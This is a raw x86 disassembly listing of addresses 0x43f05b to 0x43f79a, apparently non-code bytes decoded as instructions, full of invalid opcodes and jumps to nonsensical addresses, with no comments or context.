  43f05b:	adc    dl,BYTE PTR [ebx+0x72]
  43f05e:	pop    edx
  43f05f:	mov    DWORD PTR es:[edx+edi*1+0x26f94591],esi
  43f067:	orps   xmm0,XMMWORD PTR [edx-0x3e]
  43f06b:	sub    cl,BYTE PTR [ecx+0x55913e6c]
  43f071:	add    DWORD PTR ds:0xb8e6e055,ebp
  43f077:	mov    BYTE PTR [eax],0xb9
  43f07a:	mov    bl,0xe
  43f07c:	add    DWORD PTR [ecx],0xffffff9a
  43f07f:	pop    ss
  43f080:	xchg   DWORD PTR [ecx],ecx
  43f082:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f083:	push   cs
  43f084:	add    BYTE PTR [esi],cl
  43f086:	fmul   DWORD PTR [esp+ebp*1-0x74f191c8]
  43f08d:	mov    dh,0xa6
  43f08f:	(bad)  
  43f090:	rol    BYTE PTR [esi+eiz*4-0x4c82f831],0xe
  43f098:	add    al,al
  43f09a:	jg     0x43f0b4
  43f09c:	add    BYTE PTR [ecx+0x2e],bh
  43f09f:	call   0x6b512ab4
  43f0a4:	jge    0x43f073
  43f0a6:	mov    bl,0x17
  43f0a8:	test   BYTE PTR [eax],al
  43f0aa:	add    BYTE PTR [eax],al
  43f0ac:	add    BYTE PTR [eax],al
  43f0ae:	inc    edx
  43f0af:	popf   
  43f0b0:	push   cs
  43f0b1:	add    BYTE PTR [esi],ch
  43f0b3:	sub    ebx,0x933f1cfe
  43f0b9:	into   
  43f0ba:	jp     0x43f10f
  43f0bc:	sub    al,0x83
  43f0be:	ja     0x43f06b
  43f0c0:	xchg   ecx,eax
  43f0c1:	push   ebp
  43f0c2:	nop
  43f0c3:	mov    eax,ds:0xa713d812
  43f0c8:	std    
  43f0c9:	ins    DWORD PTR es:[edi],dx
  43f0ca:	imul   DWORD PTR ss:[ecx]
  43f0cd:	or     BYTE PTR [edx+0xb7ee77d],dl
  43f0d3:	loopne 0x43f06f
  43f0d5:	(bad)  
  43f0d6:	(bad)  
  43f0d7:	jge    0x43f0b8
  43f0d9:	gs nop
  43f0db:	arpl   WORD PTR [edx],dx
  43f0dd:	xchg   ax,ax
  43f0df:	loope  0x43f112
  43f0e1:	dec    ecx
  43f0e2:	nop
  43f0e3:	or     DWORD PTR [ebx+0xc737840],ebx
  43f0e9:	mov    eax,DWORD PTR [ebp-0x23]
  43f0ec:	or     BYTE PTR [edi+0x5095e56d],al
  43f0f2:	test   al,0x9a
  43f0f4:	cmp    al,0xe8
  43f0f6:	pop    ecx
  43f0f7:	cwde   
  43f0f8:	adc    al,BYTE PTR [eax]
  43f0fa:	or     esi,DWORD PTR [esi-0x7e34d356]
  43f100:	sub    DWORD PTR [eax],ebx
  43f102:	arpl   WORD PTR [edi],dx
  43f104:	stos   BYTE PTR es:[edi],al
  43f105:	add    BYTE PTR [ecx-0x56fff1f7],dl
  43f10b:	cdq    
  43f10c:	add    eax,DWORD PTR [eax]
  43f10e:	nop
  43f10f:	sub    BYTE PTR [ecx],0x20
  43f112:	add    BYTE PTR [eax],al
  43f114:	add    BYTE PTR [eax],al
  43f116:	add    BYTE PTR [edi-0x3b],cl
  43f119:	add    al,BYTE PTR [eax]
  43f11b:	nop
  43f11c:	or     ecx,DWORD PTR [esi]
  43f11e:	adc    DWORD PTR [eax-0x28],0xffffffe8
  43f122:	rcl    al,0x9b
  43f125:	mov    eax,ds:0xb85d67f8
  43f12a:	inc    eax
  43f12b:	mov    BYTE PTR [edx],cl
  43f12d:	adc    DWORD PTR [ecx+eax*1-0x60fff1f4],eax
  43f134:	jge    0x43f103
  43f136:	mov    esi,0xc4951430
  43f13b:	push   ecx
  43f13c:	jae    0x43f158
  43f13e:	std    
  43f13f:	push   eax
  43f140:	mov    bl,0xc4
  43f142:	shl    esi,1
  43f144:	xchg   ebp,eax
  43f145:	test   DWORD PTR [ebx],0x8106fd90
  43f14b:	dec    ebp
  43f14c:	add    BYTE PTR [eax+0x1633448a],0x7
  43f153:	adc    cl,bh
  43f155:	fild   QWORD PTR [edi]
  43f157:	xchg   esi,eax
  43f158:	sub    DWORD PTR [ebx-0x209feaf5],edi
  43f15e:	mov    esi,0x45d39ab7
  43f163:	push   eax
  43f164:	mov    dl,0xbe
  43f166:	lods   eax,DWORD PTR ds:[esi]
  43f167:	xchg   edi,eax
  43f168:	mov    dl,0xf7
  43f16a:	mov    dl,BYTE PTR [eax-0x32]
  43f16d:	mov    dh,0xaa
  43f16f:	xchg   ebx,eax
  43f170:	sub    DWORD PTR [ebp+0x74a5ee82],ebx
  43f176:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f177:	xchg   ebx,eax
  43f178:	xor    DWORD PTR [edi+0xb],esi
  43f17e:	add    BYTE PTR [eax],al
  43f180:	adc    esi,ebx
  43f182:	and    bh,dl
  43f184:	push   cs
  43f185:	data16 fstp TBYTE PTR [ecx-0x52]
  43f189:	cmc    
  43f18a:	test   DWORD PTR [ebx],0xa1a4b22e
  43f190:	xor    eax,0xf040db2
  43f195:	pop    esi
  43f196:	retf   
  43f197:	stos   DWORD PTR es:[edi],eax
  43f198:	sbb    eax,0xd03f76b
  43f19d:	addr16 out dx,eax
  43f19f:	mov    ah,dl
  43f1a1:	cli    
  43f1a2:	mov    dh,0xaa
  43f1a4:	(bad)  
  43f1a5:	std    
  43f1a6:	and    al,0x82
  43f1a8:	dec    esp
  43f1a9:	mov    al,0x74
  43f1ab:	retf   0x2b8e
  43f1ae:	mov    ecx,0x773171b
  43f1b3:	lea    edi,[eax-0x3f]
  43f1b6:	sub    al,0xf2
  43f1b8:	inc    ecx
  43f1b9:	or     ebx,DWORD PTR [ebx+0xeb29013]
  43f1bf:	repnz dec ebx
  43f1c1:	adc    ebx,0x62
  43f1c4:	loopne 0x43f1c0
  43f1c6:	idiv   DWORD PTR [eax-0x7d]
  43f1c9:	mov    dl,0xe
  43f1cb:	jb     0x43f18d
  43f1cd:	stos   BYTE PTR es:[edi],al
  43f1ce:	shr    DWORD PTR [ebx-0x56a72985],1
  43f1d4:	xchg   ebx,eax
  43f1d5:	das    
  43f1d6:	inc    esp
  43f1d7:	add    DWORD PTR [esp+ebp*1],edi
  43f1da:	(bad)  
  43f1db:	call   0xda2c6973
  43f1e0:	ret    0x8d94
  43f1e3:	ins    BYTE PTR es:[edi],dx
  43f1e4:	add    BYTE PTR [eax],al
  43f1e6:	add    BYTE PTR [eax],al
  43f1e8:	add    BYTE PTR [edi],bh
  43f1ea:	cmc    
  43f1eb:	sbb    BYTE PTR [ebp-0x3a],ch
  43f1ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f1ef:	push   cs
  43f1f0:	jmp    0xd6513281
  43f1f5:	push   edi
  43f1f6:	not    BYTE PTR [ebp+0x4cd4c19f]
  43f1fc:	push   0xe
  43f1fe:	lods   eax,DWORD PTR ds:[esi]
  43f1ff:	xchg   edi,eax
  43f200:	adc    al,0x4
  43f202:	test   cl,0x6a
  43f205:	push   es
  43f206:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f207:	pop    esp
  43f208:	(bad)  
  43f209:	or     ebx,DWORD PTR [edx-0x2]
  43f20c:	push   0x6419ace9
  43f211:	pop    eax
  43f212:	mov    ds:0x35ece90e,al
  43f217:	jns    0xf6a6a4a9
  43f21d:	sbb    BYTE PTR [ecx+0x16],dh
  43f220:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f221:	int3   
  43f222:	call   0xaef7:0xb2d427ca
  43f229:	mov    ds:0xad720eb2,eax
  43f22e:	rcl    BYTE PTR [ebx-0x6a535fd7],cl
  43f234:	and    dl,BYTE PTR [ebx+0xd]
  43f237:	pop    ss
  43f238:	push   0x33
  43f23a:	cmc    
  43f23b:	xchg   esi,eax
  43f23c:	add    BYTE PTR [ecx+0x47],al
  43f23f:	dec    edi
  43f240:	adc    BYTE PTR [ecx],bh
  43f242:	mov    dl,0xe
  43f244:	add    ch,bh
  43f246:	popf   
  43f247:	xchg   esi,eax
  43f248:	pop    ebp
  43f249:	jne    0x43f23a
  43f24b:	repnz or BYTE PTR [eax],al
  43f24e:	add    BYTE PTR [eax],al
  43f250:	add    BYTE PTR [eax],al
  43f252:	add    esi,DWORD PTR [edx+0x26955595]
  43f258:	inc    ebp
  43f259:	in     eax,dx
  43f25a:	mov    dl,0xb5
  43f25c:	push   es
  43f25d:	push   edx
  43f25e:	fld    DWORD PTR [edi+0x10]
  43f261:	dec    esi
  43f262:	stc    
  43f263:	scas   eax,DWORD PTR es:[edi]
  43f264:	xchg   ebx,eax
  43f265:	push   ebp
  43f266:	xchg   ecx,eax
  43f267:	daa    
  43f268:	dec    edi
  43f269:	sbb    BYTE PTR [edx],bh
  43f26b:	fstp   TBYTE PTR [edx]
  43f26d:	imul   BYTE PTR [esi-0x600140b]
  43f273:	scas   eax,DWORD PTR es:[edi]
  43f274:	repz add eax,0x730a3d7a
  43f27a:	mov    esi,DWORD PTR [ecx]
  43f27c:	gs cld 
  43f27e:	jmp    0xe9948531
  43f283:	scas   eax,DWORD PTR es:[edi]
  43f284:	push   cs
  43f285:	(bad)  
  43f287:	mov    cl,0xe7
  43f289:	dec    ebp
  43f28a:	add    eax,0xc9d3d82b
  43f28f:	jno    0x43f2fc
  43f291:	(bad)  
  43f292:	mov    eax,ds:0xbaf83d28
  43f297:	xlat   BYTE PTR ds:[ebx]
  43f298:	push   0xfffffffe
  43f29a:	leave  
  43f29b:	rol    esp,0x8b
  43f29e:	outs   dx,BYTE PTR ds:[esi]
  43f29f:	push   cs
  43f2a0:	(bad)  
  43f2a1:	ror    BYTE PTR [ebp+0x6d5891b2],0x46
  43f2a8:	dec    edi
  43f2a9:	adc    BYTE PTR [ecx-0x4f],ch
  43f2ac:	push   cs
  43f2ad:	add    BYTE PTR [ebp+0xd],bh
  43f2b0:	xchg   edx,eax
  43f2b1:	pop    ebp
  43f2b2:	lds    ebp,FWORD PTR [edx]
  43f2b4:	ror    DWORD PTR [ebx+0x0],cl
  43f2ba:	add    BYTE PTR [edx-0x6ff70f10],ch
  43f2c0:	retf   0xfb7
  43f2c3:	push   ecx
  43f2c4:	jo     0x43f2cb
  43f2c6:	xchg   sp,ax
  43f2c8:	jle    0x43f2f2
  43f2ca:	in     al,dx
  43f2cb:	sbb    BYTE PTR [esi-0x4f],al
  43f2ce:	xchg   ebp,esp
  43f2d0:	imul   edx,DWORD PTR [ebp+0x5290275a],0x18
  43f2d7:	sar    BYTE PTR [edx],0xb6
  43f2da:	(bad)  
  43f2db:	aad    0x9
  43f2dd:	push   cs
  43f2de:	test   ebp,eax
  43f2e0:	mov    eax,ds:0xd8784094
  43f2e5:	(bad)  
  43f2e6:	sub    al,0x6
  43f2e8:	(bad)  
  43f2e9:	jmp    0x95e5:0xe0907fc
  43f2f0:	mov    BYTE PTR [ebx-0x71187cf1],ah
  43f2f6:	jp     0x43f2e4
  43f2f8:	or     BYTE PTR ds:0xe03c484,cl
  43f2fe:	add    BYTE PTR [edi+0x45f91113],cl
  43f304:	in     eax,0x69
  43f306:	leave  
  43f307:	jecxz  0x43f2f1
  43f309:	push   eax
  43f30a:	jge    0x43f2da
  43f30c:	add    BYTE PTR [ebx+0x52],ch
  43f30f:	mov    eax,0xb67cd607
  43f314:	fsub   DWORD PTR [ebx]
  43f316:	ficomp DWORD PTR [ebx]
  43f318:	(bad)  
  43f319:	repnz adc al,0x9c
  43f31d:	add    al,0x85
  43f31f:	add    BYTE PTR [eax],al
  43f321:	add    BYTE PTR [eax],al
  43f323:	add    bl,cl
  43f325:	mov    DWORD PTR [ebx+0xe0990f8],esi
  43f32b:	xchg   eax,ebx
  43f32d:	jecxz  0x43f397
  43f32f:	dec    eax
  43f330:	mov    al,0x64
  43f332:	sar    DWORD PTR [esi+0x3e6ad468],1
  43f338:	test   BYTE PTR [eax+0x55],ch
  43f33b:	adc    BYTE PTR [eax-0x6ffc0a4e],dl
  43f341:	jmpw   0xadc0
  43f345:	fidiv  WORD PTR [esi]
  43f347:	lahf   
  43f348:	(bad)  
  43f349:	pop    esp
  43f34a:	cmc    
  43f34b:	and    dl,0xde
  43f34e:	pop    edi
  43f34f:	push   ecx
  43f350:	cmp    edi,DWORD PTR [esi]
  43f352:	mov    cl,0xb
  43f354:	into   
  43f355:	or     BYTE PTR [edi+0xf],0xcb
  43f359:	mov    dl,0xf7
  43f35b:	jle    0x43f31f
  43f35d:	jmp    0xf74c:0xa5884b5e
  43f364:	and    edx,edi
  43f366:	clc    
  43f367:	pop    es
  43f368:	nop
  43f369:	mov    dl,0xf7
  43f36b:	mov    edx,0x7f7c250
  43f370:	nop
  43f371:	mov    dl,0x63
  43f373:	and    al,0x7d
  43f375:	lock (bad) 
  43f377:	ss xchg esi,eax
  43f379:	xor    eax,0xc0efaf7b
  43f37e:	jnp    0x43f3d1
  43f380:	cdq    
  43f381:	mov    dl,0xf7
  43f383:	add    ah,BYTE PTR [edx]
  43f385:	mov    ch,0xc0
  43f387:	inc    eax
  43f388:	add    BYTE PTR [eax],al
  43f38a:	add    BYTE PTR [eax],al
  43f38c:	add    ah,dl
  43f38e:	cmp    eax,0x74efd68a
  43f393:	je     0x43f35e
  43f395:	(bad)  
  43f396:	cmp    eax,DWORD PTR [ebx]
  43f398:	lods   al,BYTE PTR ds:[esi]
  43f399:	mov    esp,0x87b17509
  43f39e:	fs cdq 
  43f3a0:	jle    0x43f3f2
  43f3a2:	xchg   edx,eax
  43f3a3:	pop    esi
  43f3a4:	push   edx
  43f3a5:	push   eax
  43f3a6:	aaa    
  43f3a7:	mov    eax,0x203a9d37
  43f3ac:	sbb    BYTE PTR [ecx-0x71fc1887],ah
  43f3b2:	icebp  
  43f3b3:	div    DWORD PTR [edi]
  43f3b5:	stos   BYTE PTR es:[edi],al
  43f3b6:	cmp    cl,BYTE PTR [ebx]
  43f3b8:	mov    al,ds:0xe10edd3e
  43f3bd:	xchg   ebp,eax
  43f3be:	lock call 0xe654:0x4c39301c
  43f3c6:	add    BYTE PTR [esi],0xb8
  43f3c9:	(bad)
  43f3cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f3cd:	xchg   ebx,eax
  43f3ce:	mov    dl,0x95
  43f3d0:	mov    ah,0xfb
  43f3d2:	aaa    
  43f3d3:	push   edx
  43f3d4:	loope  0x43f414
  43f3d6:	push   es
  43f3d7:	push   ds
  43f3d8:	aaa    
  43f3d9:	push   ds
  43f3da:	mov    ebx,0x3433ae95
  43f3df:	iret   
  43f3e0:	mov    ch,0x9a
  43f3e2:	repz dec esi
  43f3e4:	stc    
  43f3e5:	xchg   ebx,eax
  43f3e6:	mov    dl,0xe
  43f3e8:	jmp    0xe957a637
  43f3ed:	xchg   ebx,eax
  43f3ee:	mov    dl,0xe1
  43f3f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f3f1:	add    BYTE PTR [eax],al
  43f3f3:	add    BYTE PTR [eax],al
  43f3f5:	add    BYTE PTR [ebx-0x6c16ed4e],ah
  43f3fb:	mov    ebx,0xb2935692
  43f400:	push   cs
  43f401:	bound  ecx,QWORD PTR [edx+0x72]
  43f404:	xchg   ebp,eax
  43f405:	pushf  
  43f406:	aas    
  43f407:	cmp    BYTE PTR [ebp+ebx*8-0xb],dl
  43f40b:	das    
  43f40c:	popa   
  43f40d:	in     al,0x5c
  43f40f:	xor    BYTE PTR [eax-0x30cbe7dc],bl
  43f415:	ficom  WORD PTR [edi]
  43f417:	pop    esi
  43f418:	push   cs
  43f419:	jmp    0x99e2bb1
  43f41e:	pop    ss
  43f41f:	clc    
  43f420:	(bad)  
  43f421:	div    DWORD PTR [eax+edi*2]
  43f424:	(bad)  
  43f425:	pop    edi
  43f426:	outs   dx,DWORD PTR ds:[esi]
  43f427:	push   es
  43f428:	xchg   esp,eax
  43f429:	mov    al,0x68
  43f42b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f42c:	xchg   ebp,eax
  43f42d:	ss mov ah,0x35
  43f430:	push   ebp
  43f431:	std    
  43f432:	mov    ah,0x79
  43f434:	dec    esi
  43f435:	(bad)  
  43f436:	out    0xca,al
  43f438:	xchg   edi,eax
  43f439:	add    BYTE PTR [edx+ebx*1+0x2e52c7eb],bh
  43f440:	pusha  
  43f441:	add    eax,0x8bf28952
  43f446:	cmp    ebp,DWORD PTR [esi+0x3c]
  43f449:	clc    
  43f44a:	sub    DWORD PTR [edi+0x4c],ebp
  43f44d:	aam    0x6a
  43f44f:	jns    0x43f443
  43f451:	push   edx
  43f452:	sbb    DWORD PTR [esp+edx*2+0x4c],ecx
  43f456:	cmp    DWORD PTR [ebx+edx*4+0x45],esi
  43f45d:	add    BYTE PTR [eax],al
  43f45f:	test   DWORD PTR [ebp+0x3c],ebp
  43f462:	clc    
  43f463:	stos   BYTE PTR es:[edi],al
  43f464:	cli    
  43f465:	adc    eax,0xec3e6f7
  43f46a:	add    bh,BYTE PTR [ecx]
  43f46c:	mov    ah,0x62
  43f46e:	sbb    ah,BYTE PTR [edx-0xb741d79]
  43f474:	sbb    edx,DWORD PTR [ebx+0x3e86214f]
  43f47a:	push   ecx
  43f47b:	xchg   ecx,eax
  43f47c:	mov    ecx,0x6ef9005a
  43f481:	cmp    al,0xf8
  43f483:	cmp    BYTE PTR [ecx+0x6],0x8b
  43f487:	and    al,0x28
  43f489:	xor    DWORD PTR [ebp-0x3],eax
  43f48c:	mov    dh,0xbe
  43f48e:	sub    DWORD PTR [esi-0xeaa6e8a],esi
  43f494:	ss addr16 inc eax
  43f497:	jmp    0xef98824e
  43f49c:	mov    bl,0xe
  43f49e:	(bad)  
  43f49f:	jbe    0x43f517
  43f4a1:	push   cs
  43f4a2:	add    BYTE PTR [ecx-0x58f8304d],ch
  43f4a8:	mov    bl,0xe
  43f4aa:	add    dh,ah
  43f4ac:	jp     0x43f4ac
  43f4ae:	jmp    DWORD PTR [ecx+0x350f0eb3]
  43f4b4:	cmp    ch,dl
  43f4b6:	call   DWORD PTR [eax-0x73856d27]
  43f4bc:	(bad)  [esi]
  43f4be:	test   al,al
  43f4c0:	out    0xd,eax
  43f4c2:	add    BYTE PTR [eax],al
  43f4c4:	add    BYTE PTR [eax],al
  43f4c6:	add    BYTE PTR [eax],al
  43f4c8:	ret    
  43f4c9:	sbb    DWORD PTR [ecx+0x46],ebp
  43f4cc:	nop
  43f4cd:	fsub   DWORD PTR [edi+0xb]
  43f4d0:	sbb    BYTE PTR [ecx+0x645c4265],0x56
  43f4d7:	and    BYTE PTR [ecx],cl
  43f4d9:	push   ds
  43f4da:	mov    dl,0x82
  43f4dc:	push   eax
  43f4dd:	or     eax,0xddd884ed
  43f4e2:	fs dec edx
  43f4e4:	pop    esp
  43f4e5:	pop    esi
  43f4e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f4e7:	jae    0x43f490
  43f4e9:	fs dec esi
  43f4eb:	inc    eax
  43f4ec:	jnp    0x43f4ff
  43f4ee:	out    dx,al
  43f4ef:	ins    BYTE PTR es:[edi],dx
  43f4f0:	lahf   
  43f4f1:	push   esp
  43f4f2:	inc    eax
  43f4f3:	aam    0x1a
  43f4f5:	push   ds
  43f4f6:	mov    dl,0x87
  43f4f8:	xchg   esp,eax
  43f4f9:	jecxz  0x43f499
  43f4fb:	inc    eax
  43f4fc:	rcl    BYTE PTR [eax+eax*2-0x8],1
  43f500:	adc    edi,DWORD PTR [esi]
  43f502:	mov    dl,0xff
  43f504:	and    ecx,0x6a
  43f507:	inc    edx
  43f508:	add    al,0xf4
  43f50a:	push   eax
  43f50b:	cld    
  43f50c:	sub    BYTE PTR [eax-0x267fbf5a],0x13
  43f513:	add    BYTE PTR [eax+0x4d85018d],dl
  43f519:	add    eax,0x53d85266
  43f51e:	push   ecx
  43f51f:	sbb    BYTE PTR [ecx-0x55],ah
  43f522:	inc    edx
  43f523:	call   0x569955
  43f528:	or     eax,esi
  43f52a:	mov    edx,0x86
  43f52f:	add    BYTE PTR [eax],al
  43f531:	dec    edi
  43f532:	add    DWORD PTR [ebp+0x42],esp
  43f535:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f536:	mov    cl,0x57
  43f538:	cld    
  43f539:	xchg   ebx,eax
  43f53a:	mov    dl,0xa7
  43f53c:	sbb    DWORD PTR [edx],0xffffffd6
  43f53f:	idiv   DWORD PTR [edx+eax*2-0x16]
  43f543:	lock mov BYTE PTR [edx-0x40],al
  43f547:	test   DWORD PTR [ebx],0x475cbd6d
  43f54d:	mov    al,0x37
  43f54f:	mov    eax,0x37f59138
  43f554:	adc    BYTE PTR [eax+0x5103f7b2],dl
  43f55a:	jbe    0x43f513
  43f55c:	add    edx,DWORD PTR [eax-0x6f39084e]
  43f562:	mov    ch,0xf7
  43f564:	add    edx,DWORD PTR [eax-0x6fec4f1b]
  43f56a:	ret    0x3f7
  43f56d:	mov    DWORD PTR [esi],esi
  43f56f:	pusha  
  43f570:	add    al,0x90
  43f572:	mov    dl,0x74
  43f574:	xor    DWORD PTR [ebx+esi*4],ebp
  43f577:	enter  0xa687,0xbf
  43f57b:	test   DWORD PTR [ebx],0x287af26d
  43f581:	ins    BYTE PTR es:[edi],dx
  43f582:	mov    dl,0xf0
  43f584:	jne    0x43f521
  43f586:	ret    0x7cb7
  43f589:	push   edx
  43f58a:	out    0x5c,al
  43f58c:	inc    edi
  43f58d:	mov    al,0x3b
  43f58f:	mov    ebx,0x6bf312a7
  43f594:	in     al,0x0
  43f596:	add    BYTE PTR [eax],al
  43f598:	add    BYTE PTR [eax],al
  43f59a:	adc    al,0x7b
  43f59c:	sar    DWORD PTR [edx+ebx*2+0x6],cl
  43f5a0:	jnp    0x43f55e
  43f5a2:	arpl   bp,ax
  43f5a4:	pop    esp
  43f5a5:	ds push eax
  43f5a7:	test   eax,0xbd3cdc2f
  43f5ac:	ins    BYTE PTR es:[edi],dx
  43f5ad:	pop    eax
  43f5ae:	fdivr  QWORD PTR [eax]
  43f5b0:	cmp    ebp,DWORD PTR [eax-0x512248e9]
  43f5b6:	push   eax
  43f5b7:	jb     0x43f5c7
  43f5b9:	bound  ecx,QWORD PTR [eax-0x16]
  43f5bc:	lea    ebp,[eax+edi*8]
  43f5bf:	in     eax,dx
  43f5c0:	pop    ebp
  43f5c1:	icebp  
  43f5c2:	sbb    dh,BYTE PTR [eax-0x1e]
  43f5c5:	loop   0x43f60f
  43f5c7:	out    dx,al
  43f5c8:	pop    esp
  43f5c9:	push   esi
  43f5ca:	inc    esi
  43f5cb:	jb     0x43f5cb
  43f5cd:	call   0xfd52a863
  43f5d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f5d3:	aaa    
  43f5d4:	pop    esp
  43f5d5:	jne    0x43f5d1
  43f5d7:	and    dh,0x62
  43f5da:	(bad)  
  43f5db:	retf   0x1b3f
  43f5de:	mov    esp,0x93b3a3da
  43f5e3:	mov    dl,0x95
  43f5e5:	mov    ah,0x2b
  43f5e7:	xor    al,0x52
  43f5e9:	icebp  
  43f5ea:	retf   0xe270
  43f5ed:	add    cl,bl
  43f5ef:	out    dx,al
  43f5f0:	or     eax,0xf2681219
  43f5f5:	jmp    0xe72a76ae
  43f5fa:	sbb    BYTE PTR [eax+0xe91b],dh
  43f600:	add    BYTE PTR [eax],al
  43f602:	add    BYTE PTR [ebx-0x298de729],dl
  43f608:	xchg   edx,eax
  43f609:	xchg   ebx,eax
  43f60a:	sub    DWORD PTR [edi-0x4d],ebx
  43f60d:	shr    DWORD PTR [ecx-0x16161309],1
  43f613:	xchg   ebx,eax
  43f614:	repz adc ecx,esi
  43f617:	xchg   ebx,eax
  43f618:	mov    dl,0xe
  43f61a:	test   BYTE PTR [ebp-0x3e],0xe
  43f61e:	jmp    0x43f5b3
  43f620:	mov    dl,0x62
  43f622:	lods   al,BYTE PTR ds:[esi]
  43f623:	adc    ch,bl
  43f625:	(bad)  
  43f626:	pop    ecx
  43f627:	mov    esp,0x93e98637
  43f62c:	mov    dl,0xe
  43f62e:	push   0x7f
  43f630:	out    dx,al
  43f631:	push   cs
  43f632:	fimul  WORD PTR [edi]
  43f634:	cld    
  43f635:	sbb    al,BYTE PTR [eax]
  43f637:	test   eax,0xabb617b0
  43f63c:	sbb    eax,0x2c32fc55
  43f641:	fneni(8087 only) 
  43f643:	jnp    0x43f678
  43f645:	ror    BYTE PTR [eax],1
  43f647:	and    BYTE PTR [ebp+0x32d103e6],al
  43f64d:	call   0x1740a162
  43f652:	mov    bh,0xa6
  43f654:	mov    esi,0x3586d923
  43f659:	jecxz  0x43f656
  43f65b:	neg    BYTE PTR ds:0x262adb3b
  43f661:	xchg   ebx,eax
  43f662:	inc    edi
  43f663:	pop    ecx
  43f664:	xor    eax,0x74aa
  43f669:	add    BYTE PTR [eax],al
  43f66b:	add    BYTE PTR [edi+0x6b],bl
  43f66e:	push   esi
  43f66f:	adc    BYTE PTR [eax-0x277ceee9],ch
  43f675:	scas   eax,DWORD PTR es:[edi]
  43f676:	xchg   ecx,eax
  43f677:	dec    eax
  43f678:	inc    ebp
  43f679:	imul   edi,DWORD PTR [esi],0x20
  43f67c:	outs   dx,BYTE PTR ds:[esi]
  43f67d:	jo     0x43f69d
  43f67f:	add    DWORD PTR [ecx],ebp
  43f681:	mov    al,0xe
  43f683:	push   0x39
  43f685:	retf   0x6a0e
  43f688:	cmp    DWORD PTR [eax+0x0],ecx
  43f68b:	dec    edx
  43f68c:	sub    DWORD PTR [eax+0x6b214d93],esi
  43f692:	cmp    al,0xf8
  43f694:	jo     0x43f70b
  43f696:	push   es
  43f697:	mov    DWORD PTR [eax],edi
  43f699:	loopne 0x43f669
  43f69b:	pop    es
  43f69c:	add    dh,BYTE PTR [eax-0x4d5ffff2]
  43f6a2:	sbb    al,BYTE PTR [eax]
  43f6a4:	stc    
  43f6a5:	xor    ch,al
  43f6a7:	and    BYTE PTR [edx-0x2f],ch
  43f6aa:	push   0x7d
  43f6ac:	cmc    
  43f6ad:	scas   eax,DWORD PTR es:[edi]
  43f6ae:	pop    ss
  43f6af:	test   BYTE PTR [edx-0x4e],dl
  43f6b2:	push   cs
  43f6b3:	add    BYTE PTR [eax-0x39029c2c],dl
  43f6b9:	into   
  43f6ba:	sahf   
  43f6bb:	test   dh,cl
  43f6bd:	dec    eax
  43f6be:	scas   al,BYTE PTR es:[edi]
  43f6bf:	cmp    eax,0x86e61413
  43f6c4:	inc    ebp
  43f6c5:	and    DWORD PTR [edi],ecx
  43f6c7:	fcom   DWORD PTR [ebx]
  43f6c9:	sbb    al,0xee
  43f6cb:	ins    DWORD PTR es:[edi],dx
  43f6cc:	mov    esi,0x84a660
  43f6d1:	add    BYTE PTR [eax],al
  43f6d3:	add    BYTE PTR [eax],al
  43f6d5:	rcr    DWORD PTR [edx],cl
  43f6d7:	scas   al,BYTE PTR es:[edi]
  43f6d8:	movups XMMWORD PTR [edx],xmm7
  43f6db:	push   cs
  43f6dc:	stc    
  43f6dd:	nop
  43f6de:	(bad)  [esi]
  43f6e0:	enter  0x180b,0xcd
  43f6e4:	out    0x88,eax
  43f6e6:	sbb    ch,BYTE PTR [ebp-0x45264af9]
  43f6ec:	jmp    DWORD PTR [edi-0x28]
  43f6ef:	int3   
  43f6f0:	test   ch,cl
  43f6f2:	loope  0x43f6c0
  43f6f4:	in     al,0x78
  43f6f6:	fmul   st,st(6)
  43f6f8:	xchg   bh,dl
  43f6fa:	loope  0x43f760
  43f6fc:	ds or  al,0xd7
  43f700:	sub    al,0x46
  43f702:	pushf  
  43f703:	adc    al,BYTE PTR [esi]
  43f705:	nop
  43f706:	(bad)  ds:0xdd5af7d
  43f70c:	or     DWORD PTR [ebx+ebx*2],ecx
  43f70f:	out    0xff,al
  43f711:	pop    ds
  43f712:	aas    
  43f713:	push   cs
  43f714:	xchg   ax,ax
  43f716:	aas    
  43f717:	push   cs
  43f718:	call   0x52148a
  43f71d:	sbb    esp,DWORD PTR [esi]
  43f71f:	out    0x86,al
  43f721:	push   edi
  43f722:	shl    DWORD PTR [ebp+edi*1-0x40],1
  43f726:	pusha  
  43f727:	inc    eax
  43f728:	clc    
  43f729:	xlat   BYTE PTR ds:[ebx]
  43f72a:	(bad)  
  43f72c:	jmp    edi
  43f72e:	fmul   DWORD PTR [esi-0x54d7386]
  43f734:	cli    
  43f735:	adc    ecx,DWORD PTR [esi]
  43f737:	fld    QWORD PTR [ebx]
  43f739:	add    BYTE PTR [eax],al
  43f73b:	add    BYTE PTR [eax],al
  43f73d:	add    BYTE PTR [eax-0x6e07bcd1],dl
  43f743:	mov    ebx,0xb294d673
  43f748:	test   DWORD PTR [esi+0x2ff7b638],0x87b23784
  43f752:	(bad)  
  43f753:	mov    dl,0x84
  43f755:	lahf   
  43f756:	je     0x43f739
  43f758:	mov    eax,0xf7b27e03
  43f75d:	add    esi,DWORD PTR [edi-0x73]
  43f760:	in     al,dx
  43f761:	add    edx,DWORD PTR [eax-0x12f865cb]
  43f767:	pushf  
  43f768:	jl     0x43f76c
  43f76a:	or     ecx,DWORD PTR [esi-0x8]
  43f76d:	add    edx,DWORD PTR [eax+0x642974b2]
  43f773:	mov    bl,0xc8
  43f775:	jg     0x43f775
  43f777:	mov    ebp,0x208903f7
  43f77c:	imul   BYTE PTR [edx-0x45931926]
  43f782:	push   esp
  43f783:	shl    DWORD PTR [ebp+0x5ebb5186],cl
  43f789:	push   ecx
  43f78a:	cmp    BYTE PTR [esi-0x49d678d1],dh
  43f790:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f791:	leave  
  43f792:	or     al,0xfe
  43f794:	push   es
  43f795:	lahf   
  43f796:	adc    al,0xf6
  43f798:	je     0x43f73f
  43f79a:	push   ss
